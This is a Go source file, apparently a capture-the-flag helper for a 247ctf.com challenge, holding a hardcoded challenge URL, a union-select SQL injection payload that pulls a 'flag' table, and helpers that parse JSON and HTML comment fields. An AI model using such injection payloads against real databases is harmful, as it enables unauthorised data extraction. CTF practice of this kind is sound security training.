package xss

import (
	"encoding/json"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

var (
	urlBase     string = "https://d2b62108e817b30c.247ctf.com"
	sqliPayload string = "1337 union select 1,2,3,4,5,flag FROM flag;--"
)

//Client is the main object
type Client struct {
	URLBase string
}

//New Client
func New() *Client {
	return &Client{urlBase}
}

//GetSqliPayload send payload back
func (s *Client) GetSqliPayload() string {
	return sqliPayload
}

//FetchBody html page
func FetchBody(resp *http.Response) map[string]interface{} {
	body, _ := ioutil.ReadAll(resp.Body)
	var bodyFetched map[string]interface{}
	if err := json.Unmarshal(body, &bodyFetched); err != nil {
		panic(err)
	}
	return bodyFetched
}

func parseHTML(body string) string {
	re := regexp.MustCompile(`<p class=\"comment\".*?>(.*)</p>`)

	match := re.FindAllStringSubmatch(body, -1)

	baseWithSpace := strings.Split(strings.Split(string(match[0][0]), "<p class=\"comment\">")[1], "</p>")[0]
	base := strings.Replace(baseWithSpace, " ", "+", -1)
	return base
}
